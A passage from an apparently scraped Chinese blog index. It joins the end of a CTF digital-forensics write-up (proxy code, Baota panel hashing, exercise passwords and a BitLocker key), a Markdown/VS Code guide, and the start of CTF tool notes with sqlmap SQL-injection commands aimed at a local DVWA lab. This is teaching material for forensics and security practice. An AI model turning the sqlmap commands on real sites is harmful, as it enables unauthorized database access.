进入chronusNode目录\n  186  ls  # 查看目录内容\n  187  node app.js  # 启动Node.js应用\n  188  history  # 显示命令历史\n  189  cd /opt/  # 进入/opt目录\n  190  cd honglianjingsai/  # 进入红莲竞赛目录\n  191  ls  # 查看目录内容\n  192  cd chronusNode/  # 进入chronusNode目录\n  193  cd controller/  # 进入控制器目录\n  194  ls  # 查看控制器文件\n  195  vim ADProxy.js  # 编辑ADProxy.js文件\n  196  cd ..  # 返回上级目录\n  197  ls  # 查看目录内容\n  198  cd logs/  # 进入日志目录\n  199  l;s  # 错误命令，应该是ls\n  200  ls  # 查看日志文件\n  201  ll  # 显示详细文件列表（ls -l的别名）\n  202  vim 2021-4-23-17-36.log  # 编辑日志文件\n  203  cd /opt/  # 进入/opt目录\n  204  ls  # 查看目录内容\n  205  cd honglianjingsai/  # 进入红莲竞赛目录\n  206  ls  # 查看目录内容\n  207  cd chronusNode/  # 进入chronusNode目录\n  208  ls  # 查看目录内容\n  209  cd controller/  # 进入控制器目录\n  210  ls  # 查看控制器文件\n  211  vim ADProxy.js  # 编辑ADProxy.js文件\n  212  history  # 显示命令历史\n  213  reboot  # 重启系统\n  214  cd /opt/honglianjingsai/  # 进入红莲竞赛目录\n  215  ls  # 查看目录内容\n  216  cd chronusNode/  # 进入chronusNode目录\n  217  ls  # 查看目录内容\n  218  cd logs  # 进入日志目录\n  219  ls -la  # 以长格式显示所有文件（包括隐藏文件）\n  220  cat 2021-4-23-6-53.log  # 查看日志文件内容\n  221  cat 2021-4-23-17-39.log  # 查看另一个日志文件内容\n  222  date  # 显示当前日期时间\n  223  systemctl start firewalld  # 启动防火墙服务\n  224  firewall-cmd --add-port 80/tcp  # 添加80端口到防火墙\n  225  cd ..  # 返回上级目录\n  226  ls  # 查看目录内容\n  227  cd controller/  # 进入控制器目录\n  228  ls  # 查看控制器文件\n  229  vi ADProxy.js  # 编辑ADProxy.js文件\n  230  ls  # 查看文件\n  231  vi ADTCPDeliver.js  # 编辑TCP传输控制器文件\n  232  vi ADFileServer.js  # 编辑文件服务器控制器文件\n  233  ls  # 查看文件\n  234  cd ..  # 返回上级目录\n  235  ls  # 查看目录内容\n  236  vi app.js  # 编辑主应用文件\n  237  ls  # 查看文件\n  238  cd controller/  # 进入控制器目录\n  239  ls  # 查看控制器文件\n  240  vi ADProxy.js  # 编辑ADProxy.js文件\n  241  ls  # 查看文件\n  242  cd ..  # 返回上级目录\n  243  ls  # 查看目录内容\n  244  cd model/  # 进入模型目录\n  245  ls  # 查看模型文件\n  246  cd ..  # 返回上级目录\n  247  ls  # 查看目录内容\n  248  cd node_modules/  # 进入Node.js模块目录\n  249  ls  # 查看模块文件\n  250  ifconfig  # 显示网络接口配置\n  251  reboot  # 重启系统\n  252  clear  # 清屏\n  253  cd /opt/honglianjingsai/chronusNode/  # 进入应用目录\n  254  ls  # 查看目录内容\n  255  cd logs/  # 进入日志目录\n  256  ls  # 查看日志文件\n  257  ls -la  # 以长格式显示所有文件\n  258  cd .  # 停留在当前目录\n  259  ls  # 查看文件\n  260  ls -la  # 以长格式显示所有文件\n  261  date  # 显示当前日期时间\n  262  vim 2021-4-23-18-59.log  # 编辑日志文件\n  263  date  # 显示当前日期时间\n  264  timedatectl  # 显示系统时间设置\n  265  timedatectl set-timezone UTC  # 设置时区为UTC\n  266  timedatectl  # 确认时区设置\n  267  date  # 显示当前日期时间\n  268  ls  # 查看当前目录\n  269  last  # 显示最近登录用户\n  270  clear  # 清屏\n  271  ififconfigiig  # 错误命令，应该是ifconfig\n  272  ifconfig  # 显示网络接口配置\n  273  reboot  # 重启系统\n  274  clear  # 清屏\n  275  ifconfig  # 显示网络接口配置\n  276  ifconfig  # 再次显示网络接口配置\n  277  cd /opt/honglianjingsai/chronusNode/  # 进入应用目录\n  278  node app.js  # 启动Node.js应用\n  279  shutdown -r now  # 立即重启系统\n  280  history  # 显示完整的命令历史\n```\n- 操作\n```bash\n[root@localhost ccj]# cd /opt/\n[root@localhost opt]# cd honglianjingsai/\n[root@localhost honglianjingsai]# ls\nchronusNode  node-v14.16.1-linux-x64.tar.xz  README.txt\n[root@localhost honglianjingsai]# vi README.txt\n```\n\n![alt text](/img/第三届长安杯笔记_6-1.png)\n```txt\n修改服务器端口在目录chronusNode/const.js下修改参数server_config/port，默认为8800，即访问路径http://localhost:8800即可\n修改反向代理目标地址在目录chronusNode/controller/ADProxy.js下修改函数service即可\n```\n- 找到ADProxy.js路径，打开如下：\n```js\n/**\n * 反向代理\n *\n */\nmodule.exports = function(_brain, _app) {\n    /* INCLUDE */\n    const path = _brain.A.path;\n    const async = _brain.A.async;\n    const proxy = require('http-proxy-middleware');\n    const net = require('net');\n    /* DEFINE */\n    const _tag = path.basename(__filename, \".js\");\n    var _isBanned = false;\n    var _isStarted = false;\n    if(!_brain.A.checkIsNull(_brain.C.autorun_config[_tag], _tag)){\n        _isStarted = _brain.C.autorun_config[_tag];\n    }\n    /* DEFINE PROXY */\n    const _proxy50 = {\n        protocol: 'http:',\n        host: '192.168.110.111',\n        port: 80\n    }\n    const _proxy100 = {\n        protocol: 'http:',\n        host: '192.168.110.112',\n        port: 80\n    }\n    const _proxy100p = {\n        protocol: 'http:',\n        host: '192.168.110.113',\n        port: 80\n    }\n\t/*明确配置了3个后端服务器，这是负载均衡的典型特征！！！*/\n    /* Private Function */\n    /**\n     * Service Running\n     */\n    var service = function (){\n        if(!_isStarted) return;\n        // proxy middleware options\n        const _proxyer_chronus = proxy({\n            target: '/', // target host\n            changeOrigin: true,               // needed for virtual hosted sites\n            ws: true,                          // proxy websockets\n            router: function(req) {\n                var clientIP = req.get(\"x-forwarded-for\")\n                if (clientIP == undefined) {\n                    clientIP = req.connection.remoteAddress\n                }\n                var clientIPArr = clientIP.split(\".\")\n                if (clientIPArr.length == 4) {\n                    var clientIP3Int = parseInt(clientIPArr[2])\n                    global.logger.warn('[Proxy_RequestHeader] -> ' + JSON.stringify(req.headers));\n                    global.logger.warn('[Proxy_ClientIP] -> ' + clientIP);\n\t\t\t\t\t // 基于IP第三段的分流逻辑\n                    if (clientIP3Int <= 50) {\n                        global.logger.warn('[Proxy_Destination] -> ' + JSON.stringify(_proxy50));\n                        return _proxy50\n                    } else if (clientIP3Int <= 100) {\n                        global.logger.warn('[Proxy_Destination] -> ' + JSON.stringify(_proxy100));\n                        return _proxy100\n                    } else {\n                        global.logger.warn('[Proxy_Destination] -> ' + JSON.stringify(_proxy100p));\n                        return _proxy100p\n                    }\n                }\n            }\n        })\n\n        _app.all('/*', _proxyer_chronus);// 所有请求都经过代理\n    };\n\n    /**\n     * Service Killing\n     */\n    var serviceKiller = function (){\n    };\n\n\n    /* Public Function */\n    /* 返回_tag */\n    var getTag = function (){\n        return _tag;\n    };\n    /* 判断服务是否开启 */\n    var isStarted = function (){\n        return _isStarted;\n    };\n    /* 判断服务是否被意外禁止 */\n    var isBanned = function (){\n        return _isBanned;\n    };\n\n    /* 服务开关 */\n    var startServer = function (callBack){\n        _isStarted = true;\n        service();\n        if(callBack)\n            callBack(100, _tag + ' Started');\n    };\n\n    var stopServer = function (callBack){\n        _isStarted = false;\n        serviceKiller();\n        if(callBack)\n            callBack(100, _tag + ' Stopped');\n    };\n\n    /* Service AutoRun */\n    if(_isStarted){\n        startServer();\n    }else{\n        stopServer();\n    }\n\n    return{\n        getTag             : getTag,\n        isStarted          : isStarted,\n        isBanned           : isBanned,\n        startServer        : startServer,\n        stopServer         : stopServer,\n    };\n}\n```\n- 作用：负载均衡\n\n#### 15. 上一题中，提到的主要功能对应的服务监听的端口为：\t\n- 上面README.txt中有：修改服务器端口在目录chronusNode/const.js下修改参数server_config/port，默认为8800，即访问路径http://localhost:8800即可\n- 打开const.js，寻找参数server_config/port\n```js\n    /* 服务器基本配置 */\n    server_config : {\n        host : '0.0.0.0',\n        port : 80,\n        safe_port : 8443,\n        static_path : 'static',\n        static_host : '127.0.0.1'\n```\n- 答案：80\n\n#### 16. 上一题中，提到的服务所使用的启动命令为：\t\n- 最开始历史命令可以看到：node app.js  # 启动Node.js应用\n\n#### 17. 经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】\t\n```js\nvar clientIPArr = clientIP.split(\".\")  // 将IP按点号分割成数组\nif (clientIPArr.length == 4) {\n    var clientIP3Int = parseInt(clientIPArr[2])  // 提取第三段并转为整数\n    //                      ↑\n    //                  数组索引2对应第三段\n    // 数组索引: [0]    [1]    [2]    [3]\n    // IP示例:  192  . 168  . 110  . 111\n    //          第一段  第二段  第三段  第四段\n```\n\n#### 18. 经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111.111.111.111】\t\n```js\n                    if (clientIP3Int <= 50) {\n                        global.logger.warn('[Proxy_Destination] -> ' + JSON.stringify(_proxy50));\n                        return _proxy50\n```\n```js\n    /* DEFINE PROXY */\n    const _proxy50 = {\n        protocol: 'http:',\n        host: '192.168.110.111',\n        port: 80\n    }\n```\n\n#### 19. 请分析，该服务器转发的目标服务器一共有几台【标准格式：9】\t\n- 3\n\n#### 20. 请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111.111.111.111】【问题未解答，但跳过不管了(\\*‘ v`*)】\t\n- 问题：1怎么知道是红米的那个2wp里面的诡异时间点是怎么出来的3文件导不出来\n- 报警时间：2021年4月25日，上午8点左右\n- 在日志中注意时间是UTC时间\n\n![alt text](/img/第三届长安杯笔记_6-2.png)\n- 一直访问内网192.168.110.110，所以是本地嫌疑人ip：192.168.110.203\n\n![alt text](/img/第三届长安杯笔记_6-3.png)\n- 对应时间找到ip\n\n#### 21. 请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格式：111.111.111.111】\t\n- 不管谁都是转发到192.168.110.113\n\n![alt text](/img/第三届长安杯笔记_6-4.png)\n### 通过对检材二的分析，警方进一步掌握并落地到了目标服务器地址，通过对服务器进行证据固定，得到服务器镜像--检材三，请使用第21题答案对检材三进行解密并分析，回答下列问题：\t\t\n\n#### 22. 检材三的原始硬盘的SHA256值为【问题未解答 但不管了(っ﹏-) .｡o】\n- 怎么知道是web3哇\n\n![alt text](/img/第三届长安杯笔记_6-5.png)\n\n#### 23. 请分析第21题中，所指的服务器的开机密码为：\n- 检材四 嫌疑人的PC端的Xshell中看到连接记录\n- 选择原因：看负责转发的服务器B的密码看转发对象CDE的账密是经验之谈，而不是规律\n- 但这个是选择的直接证据：没有看到192.168.110.110被转发信息\n\n![alt text](/img/第三届长安杯笔记_6-11.png)\n![alt text](/img/第三届长安杯笔记_6-10.png)\n- honglian7001\n\n#### 24. 嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为：\t\n- hl123\n\n![alt text](/img/第三届长安杯笔记_6-6.png)\n#### 25. 请分析用于重置宝塔面板密码的函数名为\t\n- [框架知识点](/2025/10/13/宝塔面板知识点)\n- 宝塔面板重置网站密码功能调用的是tools.py\n- 宝塔后台数据库叫default.db\n- 宝塔的工具面板的代码是在/www/server/panel下面，直接火眼文件里找\n- .py后缀有两个文件\n- test.py和tool.py中看到同样内容：\n```python\n#设置面板密码\ndef set_panel_pwd(password,ncli = False):\n    import db\n    sql = db.Sql()\n    result = sql.table('users').where('id=?',(1,)).setField('password',public.password_salt(public.md5(password),uid=1))\n    username = sql.table('users').where('id=?',(1,)).getField('username')\n    if ncli:\n        print(\"|-用户名: \" + username)\n        print(\"|-新密码: \" + password)\n    else:\n        print(username)\n```\n- set_panel_pwd\n\n#### 26. 请分析宝塔面板登陆密码的加密方式所使用的哈希算法为\t\n- md5 24题已知\n\n#### 27. 请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法\t\n- 3次\n```python\n#设置面板密码\ndef set_panel_pwd(password,ncli = False):\n    import db\n    sql = db.Sql()\n    result = sql.table('users').where('id=?',(1,)).setField('password',public.password_salt(public.md5(password),uid=1))\n    username = sql.table('users').where('id=?',(1,)).getField('username')\n    if ncli:\n        print(\"|-用户名: \" + username)\n        print(\"|-新密码: \" + password)\n    else:\n        print(username)\n```\n- 发现这里调用了public类的md5方法，在/www/server/panel/class里面可以找到public.py,导出搜索password：\n```py\ndef password_salt(password,username=None,uid=None):\n    '''\n        @name 为指定密码加盐\n        @author hwliang<2020-07-08>\n        @param password string(被md5加密一次的密码)\n        @param username string(用户名) 可选\n        @param uid int(uid) 可选\n        @return string\n    '''\n    chdck_salt()\n    if not uid:\n        if not username:\n            raise Exception('username或uid必需传一项')\n        uid = M('users').where('username=?',(username,)).getField('id')\n    salt = M('users').where('id=?',(uid,)).getField('salt')\n    return md5(md5(password+'_bt.cn')+salt)\n```\n\n#### 28. 请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】\t\n- v87ilhAVumZL 24题已得\n- 打开宝塔面板数据库/www/server/panel/default.db，在user表中也看\n\n#### 29. 请分析该服务器，网站源代码所在的绝对路径为\t\n\n![alt text](/img/第三届长安杯笔记_6-13.png)\n#### 30. 请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材五，并重构网站）【标准格式：111.111.111.111】：192.168.110.115-CAB2021\n- /www/wwwroot/www.honglian7001/app/databae.php\n- 遍历网站文件，找数据库文件\n\n![alt text](/img/第三届长安杯笔记_6-14.png)\n- 192.168.110.115\n\n#### 31. 请分析，数据库的登陆密码为【区分大小写】\t\n- 30题已得\n- wxrM5GtNXk5k5EPX\n\n#### 32. 请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：/web】\n- RStudioProtable-打开镜像导入文件，新建虚拟快RAID和自动检测，拖拽镜像文件，自动检测\n\n![alt text](/img/第三届长安杯笔记_6-15.png)\n- 火眼依据信息导入\n\n![alt text](/img/第三届长安杯笔记_6-16.png)\n- 问我要密码？我又不知道。。。估计火眼仿真默认改123456了账户就用root不然网站无法重构！！！\n\n#### 33. 请分析该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】\t\n\n![alt text](/img/第三届长安杯笔记_6-34.png)\n- lshi4AsSUrUOwWV\n\n#### 34. 请分析该网站的管理员用户的密码为：\t\n- 登录宝塔\n- ```bt defalt```获得为默认密码，不显示更改后密码！！！\n\n![alt text](/img/第三届长安杯笔记_6-35.png)\n- 对应案发时间，只有 202104 这个时间是比较符合的，在这个文件夹下只有两个日志，我们打开搜索 password 就可以找到只有两个密码，分别是 123456 和 security ，对应用户名都是 admin，我们只需要在刚刚重构好的登录界面尝试哪个密码可以登录到后台，哪个密码就是本题的答案（security）\n\n#### 35. 在对后台账号的密码加密处理过程中，后台一共计算几次哈希值\t\n- 见33题图，原密码md5拼接salt值的md5，拼接的结果再进行一次md5，一共3次\n\n#### 36. 请统计，后台中，一共有多少条设备记录\t\n\n![alt text](/img/第三届长安杯笔记_6-36.png)\n#### 37. 请通过后台确认，本案中受害者的手机号码为\t\n- 小白鼠.txt里面查看\n\n![alt text](/img/第三届长安杯笔记_6-33.png)\n- 设备18644099137通讯录\n\n#### 38. 请分析，本案中受害者的通讯录一共有多少条记录\n- 小白鼠.txt里面查看，上题已得：34\n\n### 通过对检材二和三进行分析，警方通过IP落地，警方掌成功抓获犯罪嫌疑人，现将嫌疑人的PC机和手机进行了取证，分别制作了镜像，请使用第13题的答案对检材四进行解密，并回答下列问题\t（192.168.110.203-CAB2021）\n\n#### 39. 请计算检材四-PC的原始硬盘的SHA256值\t\n\n![alt text](/img/第三届长安杯笔记_6-8.png)\n#### 40. 请分析，检材四-PC的Bitlocker加密分区的解密密钥为\t\n\n![alt text](/img/第三届长安杯笔记_6-7.png)\n```txt\nBitLocker 驱动器加密恢复密钥*要验证这是否为正确的恢复密钥，请将以下标识符的开头与电脑上显示的标识符值进行比较。标识符: 3BC73D1D-E5B0-4592-B9D6-42D0A306B625如果以上标识符与电脑显示的标识符匹配，则使用以下密钥解锁你的驱动器。恢复密钥: 511126-518936-161612-135234-698357-082929-144705-622578如果以上标识符与电脑显示的标识符不匹配，则该密钥不是解锁你的驱动器的正确密钥。请尝试其他恢复密钥，或参阅 https://go.microsoft.com/fwlink/?LinkID=260589 以获得其他帮助。\n```\n- 注意：Bitlocker解密后火眼要全部重新分析！！！\n\n#### 41. 请分析，检材四-PC的开机密码为\t\n- 39题已知\n\n#### 42. 经分析发现，检材四-PC是嫌疑人用于管理服务器的设备，其主要通过哪个浏览器控制网站后台\t\n- chrome\n\n![alt text](/img/第三届长安杯笔记_6-17.png)\n#### 43. 请计算PC检材中用户目录下的zip文件的sha256值\t\n- 搜索得到users目录位置\n\n![alt text](/img/第三届长安杯笔记_6-19.png)\n- 目录内搜索zip，创建任务\n\n![alt text](/img/第三届长安杯笔记_6-18.png)\n- 0DD2C00C8C6DBDEA123373F91A3234D2F07D958355F6CD7126E397E12E8ADBB3\n\n#### 44. 请分析检材四-phone，该手机的IMEI号为\t\n\n![alt text](/img/第三届长安杯笔记_6-9.png)\n#### 45. 请分析检材四-phone，嫌疑人和本案受害者是通过什么软件开始接触的【标准格式：支付宝】\t\n- 伊对\n\n![alt text](/img/第三届长安杯笔记_6-22.png)\n#### 46. 请分析检材四-phone，受害者下载恶意APK安装包的地址为\t\n- 45题两聊天记录下面就是\n- https://cowtransfer.com/s/a6b28b4818904c\n\n#### 47. 请分析检材四-phone，受害者的微信内部ID号为\t\n- wxid_op8i06j0aano22\n\n![alt text](/img/第三届长安杯笔记_6-24.png)\n#### 48. 请分析检材四-phone，嫌疑人用于敲诈本案受害者的QQ账号为\t\n- 1649840939\n\n![alt text](/img/第三届长安杯笔记_6-26.png)\n#### 49. 请综合分析，嫌疑人用于管理敲诈对象的容器文件的SHA256值为\t\n- 43题zip解压，密码为12306，与账密相同，当然也可以暴力破解，但注意暴力的位数5\n- 火眼仿真获得密码money\n- 打开此电脑快速访问\n\n![alt text](/img/第三届长安杯笔记_6-28.png)\n- VC挂载，key.rar作为密匙文件\n- 嫌疑人用于管理敲诈对象的容器文件是小白鼠.txt\n\n![alt text](/img/第三届长安杯笔记_6-31.png)\n- 9C4BE29EB5661E6EDD88A364ECC6EF004C15D61B08BD7DD0A393340180F15608\n- 但为什么小白鼠.txt导出后这么算哈希值不一样？？？\n\n![alt text](/img/第三届长安杯笔记_6-31-1.png)\n#### 50. 请综合分析嫌疑人检材，另外一受害者\"郭先生\"的手机号码为\t\n- 15266668888\n\n![alt text](/img/第三届长安杯笔记_6-29.png)\n#### 51. 通过嫌疑人检材，其中记录了几位受害者的信息\t\n- 5\n\n![alt text](/img/第三届长安杯笔记_6-30.png)\n#### 52. 请使用第11题的密码解压\"金先生转账.zip\"文件，并对压缩包中的文件计算SHA256值\t\n- 11题：c74d97b01eae257e44aa9d5bade97baf\n- cd62a83690a53e5b441838bc55ab83be92ff5ed26ec646d43911f119c15df510\n- hashcalc算\n\n#### 53. 请综合分析，受害者一共被嫌疑人敲诈了多少钱（转账截图被隐藏在多个地方）【未解决】\n- 伊对1000\n![alt text](/img/第三届长安杯笔记_6-25.png)\n- 微信2000\n![alt text](/img/第三届长安杯笔记_6-21.png)\n- QQ\n  - 600 + 【2笔转账记录我都已经保存好了/悠闲】\n![alt text](/img/第三届长安杯笔记_6-27.png)\n  - 打不开图片\n![alt text](/img/第三届长安杯笔记_6-32.png)\n- \"金先生转账.zip\"文件\n  - 2000 交易时间：2021-04-24 18:30:25\n- **数据库里面还有个？！**\n- navicat连接，导出成txt，厨子魔法棒可以发现是base64编码过的jpg图片，解码后保存为图片就能正常查看，有1000元\n![alt text](/img/第三届长安杯笔记_6-39.png)\n![alt text](/img/第三届长安杯笔记_6-38.png)\n![alt text](/img/第三届长安杯笔记_6-37.png)\n\n### 总体分析：\n- 数字是192.168.110.后第四段数字\n  - A 受害者252\n  - B apk回传数据的服务器 负责转发的服务器203\n  - C D E 建数据库的宝塔，三个转发对象111 112 113\n  - F window ssh连接三个对象\n- 192.168.110开头的IP地址属于私有地址段，通常作为路由器管理后台的默认网关。所以这几个ip在这个这个服务器集群里面是一直使用并代表所在服务器使用\n\n\t\n","tags":["wp","电子取证"],"categories":["wp"]},{"title":"markdown-github+vscode使用文档","url":"/2025/10/01/markdown-github-vscode使用文档/","content":"## 常用hexo命令\n- 本地预览\n```cmd\nhexo clean && hexo g && hexo s\n```\n\n## 引用博客内文章\n- \\[显示文字](/2025/10/日期/文字名称)\n- 例子：\n```\n[框架知识点](/2025/10/13/宝塔面板知识点)\n```\n- 效果：[框架知识点](/2025/10/13/宝塔面板知识点)\n\n## 复选框列表(github可用,hexo不支持)\n在列表符号后面加上 [x] 或者 [ ] 代表选中或者未选中情况\n\n```javascript\n- [ ] content \n-空格[空格]空格content \n```\n- [ ]括号里面的空格可以换成[x],代表选中对话框\n\n## 快捷键\n- Markdown All in One 插件支持许多 Markdown 语法的快捷键，使得格式化文本、插入链接、图片和其他元素变得非常简单。\n\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n\n| 操作 | 快捷键 | 操作 | 快捷键 |\n|:----:|:----:|:----:|:----:|\n| 加粗 | Ctrl + B | 撤销 | Ctrl + Z |\n| 斜体 | Ctrl + I | 重做 | Ctrl + Y |\n| 删除线 | Alt + S | 标题(uplevel) | Ctrl + Shift + ] |\n| Toggle math environment | Ctrl + M | 标题(downlevel) | Ctrl + Shift + [ |\n| Check/Uncheck task list item | Alt + C |  |  |\n</div>\n\n## 目录和标题\n- （Github 版）如果使用 [TOC] 命令来生成目录，需要下载 “Markdown TOC” 插件。（未实践）\n- 在 Github 版上不下载 Markdown TOC 插件创建目录的方法：按下快捷键 Ctrl + Shift + P 调出命令框，输入 Markdown ，找到 “Markdown All in One：创建目录” 即可。\n- 使用 # 符号来创建标题。一个 # 是一级标题，两个 # 是二级标题，以此类推，最多六级。\n## 文本样式\n- 使用 * 或 _ 包围的文本会变为**斜体**。\n- 使用 ** 或 __ 包围的文本会被**加粗**。\n- 使用 *** 或 ___ 包围的文本会变为**粗斜体**。\n- 使用 ~~ 包围的文本会被**横线删除**。\n- （Github 版）使用 \\<mark> 和 \\</mark> 包围的文本会被**高亮**。\n- 在 > 后的文本会被**引用**。\n- （Github 版）使用 \\<sub> 和 \\</sub> 包围的文本会变为**下标**。\n- （Github 版）使用 \\<sup> 和 \\</sup> 包围的文本会变为**上标**。\n- 使用 \\<u> 和 \\</u> 包围的文本会出现**下划线**。\n- 输入 *** 后回车，即可添加**分隔线**。\n- 编写**不被渲染输出**的内容：\\<!--文本-->\n- 在文本前使用 \\&emsp;\\&emsp; 代表在文本前按下一次**Tab 键**。\n- 若需要空一行，按下回车键即可；若需要空多行，则需要在每一行空行处添加 \\&emsp;\\&emsp; 。\n- 若需要添加在 Markdown 中具有特殊意义的字符，在该符号前添加 \\ 即可。\n## 列表\n- 使用 - 或 * 或 + 加空格来创建无序列表。\n- 使用数字加 . 后加空格来创建有序列表。\n- 使用 - [ ] 后加空格来创建待办列表，使用 - [x] 进行打勾（字母 x 或 X）。\n\n## 图片\n- 使用 \\!\\[替代文本](图片地址) 来插入图片。\n  - 带尺寸的图片：! [图片名称] (图片路径/1.png =60×60)\n  - 宽度确定高度等比例的图片：! [图片名称] (图片路径/1.png =60×)\n  - 高度确定宽度等比例的图片：! [图片名称] (图片路径/1.png =×60)\n  - 居中的图片：! [图片名称] (图片路径/1.png#pic_center)\n    居左：#pic_left ，居右：#pic_right\n    居中并且带尺寸的图片：! [图片名称] (图片路径/1.png#pic_center =60×60)\n\n## 链接\n- 使用 <链接地址> 直接显示网站链接。\n- 使用 \\[显示文本](链接地址) 来创建超链接，显示文本会代替连接出现。\n\n## 代码\n- 使用反引号插入单行代码，使用三个反引号创建代码块。\n- 段首键入 Tab 键或输出 4 个空格，即可添加代码块。\n- 段落前后添加三个反引号，即可将中间段落识别为代码块；若要在正文中键入代码，则在代码前后添加一个反引号。\n- 需要代码高亮时，在段落前的三个反引号后添加语言名称，如 python ，即可高亮显示代码块。\n\n## 表格\n- 左对齐：|:--| ，右对齐：|-\\-\\:| ，居中对齐：|:-\\-\\:| 。\n- 可以在表格中设置文本格式。例如可以添加链接，代码（仅反引号（`）中的单词或短语，而不是代码块）和强调；但是不能添加标题，块引用，列表，水平规则，图像或 HTML 标签。\n- 可以使用表格的 HTML 字符代码 &#124; 在表中显示竖线 | 字符。\n- 表格居中代码\n```html\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n\n<p align=\"center\"><font face=\"黑体\" size=2.>表1 示例表格</font></p>\n\n<div class=\"center\">\n\n|   序号   |   内容  |        描述         |\n|  :---:  |  :---:  |  :---------------:  |\n|    1    |    l    |  大写字母L的小写字母l |\n|    2    |    I    |      大写字母I       |\n|    3    |    1    |        数字1       |\n\n</div>\n```\n- 效果：\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n\n<p align=\"center\"><font face=\"黑体\" size=2.>表1 示例表格</font></p>\n\n<div class=\"center\">\n\n|   序号   |   内容  |        描述         |\n|  :---:  |  :---:  |  :---------------:  |\n|    1    |    l    |  大写字母L的小写字母l |\n|    2    |    I    |      大写字母I       |\n|    3    |    1    |        数字1       |\n\n</div>\n\n- 常用复制版本：\n```html\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n<!-- 表格输入位置 -->\n \n</div>\n```\n\n\n## 注脚与注释\n- 在文本后输入 [^数字] 添加注脚，在其它处输入 [^数字]: 添加注脚的解释。\n- 在其它处输入 *[文本]: 添加注释，在原文本处会出现虚下划线，鼠标靠近虚下划线就会出现注释内容。\n- [插件尝试](https://www.jovi.cc/add-superscript-subscript-footnote-and-other-functions-to-hexo.html/)\n  - H~2~O：H\\~2~O; H\\<sub>2\\</sub>O\n  - x^2^+：x\\^2^+; x\\<sup>2\\</sup>+\n  - <u>Inserted</u>：\\<u>Inserted\\</u>\n\n## 数学公式\n参考文章：[markdown公式符号大全](https://blog.csdn.net/konglongdanfo1/article/details/85204312)\n\n## 符号表情\n一些 Markdown 应用程序允许通过键入表情符号短代码来插入表情符号。这些以冒号开头和结尾，并包含表情符号的名称。\n一些常见的表情符号简码列表见网页：[github markdown 表情符号标记的完整列表](https://gist.github.com/rxaviers/7360908)\n\n## 其他\n- 在 CSDN 版的 Markdown 中，如果输入 (r) 或 (R) 会显示为 ® ，解决办法是：输入 \\(r\\) 或 \\(R\\) 即可。\n- 花体字母：\n![alt text](/img/markdown-github-vscode使用文档_yinwen.png)\n- HTML 字符代码 &lt; 在 Markdown 中显示 < 字符\n  HTML 字符代码 &gt; 在 Markdown 中显示 > 字符\n  HTML 字符代码 &#61; 在 Markdown 中显示 = 字符\n  其他 HTML 特殊字符对应表请参考文章：[html中显示特殊符号（附带特殊字符对应表）](https://blog.csdn.net/sunbocong/article/details/81032758)\n\n## vscode图片直接拖拽粘贴与hexo兼容\n- [参考教程](https://zhuanlan.zhihu.com/p/19128537976)\n- 设置 VSCode 的 Markdown > Copy Files:Destination\n  - 打开 vscode 设置界面，搜索“Markdown copy file”。按下图添加一个项目。\n```\nItem：**/*.md\nVaule: /img/${documentBaseName}_${fileName}\n```\n  - 打开新的 VSCode 窗口\n  - 然后以**/source/文件**为根目录打开新的VSCode窗口，然后在里面编写 markdown 文件。此时VSCode将会把图片自动粘贴在/source/img/文件夹下，Hexo 渲染出来的页面也能找到放有图片的/img/路径。\n- 注意！！！：手动删除..变成!\\[alt text](/img/xxx.png)不然网站无法识别！！！\n\n##  hexo-blog-encrypt插件加密博客文章\n- [参考教程1-知乎](https://zhuanlan.zhihu.com/p/113235573)\n- [参考教程2-github](https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md)\n- 配置优先级：文章信息头 > _config.yml (站点根目录下的) > 默认配置\n\n\n## 参考文章\n- [使用 VSCode 编写 Markdown 文件](https://blog.csdn.net/weixin_49272453/article/details/147440391?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-147440391-blog-89300713.235^v43^pc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.1&utm_relevant_index=3)\n- [Markdown表格居中显示](https://www.cnblogs.com/jianmuzi/p/16795528.html)\n- [使用Vscode和Hexo编写博客时让程序找到正确的图片路径](https://zhuanlan.zhihu.com/p/19128537976)\n- [对 Hexo 博客文章进行加密](https://zhuanlan.zhihu.com/p/113235573)\n- [hexo-blog-encrypt插件github中文README.md](https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md)","tags":["markdown","github","vscode"],"categories":["语法笔记"]},{"title":"ctf工具箱内容学习（未完成ing）","url":"/2025/08/20/ctf工具箱内容学习/","content":"\n- Burpsuite\n  - 右键发送到repeater\n\n## webshell\n### sqlmap\n- cmd打开`python sqlmap.py`\n#### 简单使用\n- GET注入\n  - 使用-u参数后面接url，url中的参数使用?拼接\n```cmd\npython2 sqlmap.py -u\"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=2&Submit=Submit\"\n```\n- 在运行时会有一些选项让我们选择Y/N，可以直接回车或者按推荐的进行选择（大写字母的即为推荐的）\n- POST注入\n  - 在后面使用`--data=\" \"`来写post参数即可，如\n```cmd\npython2 sqlmap.py -u\"http://127.0.0.1/DVWA-master/vulnerabilities/sqli\" --data=\"id=1\"\n```\n- 查询当前使用的数据库名称\n```cmd\npython2 sqlmap.py -u\"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=2&Submit=Submit\" 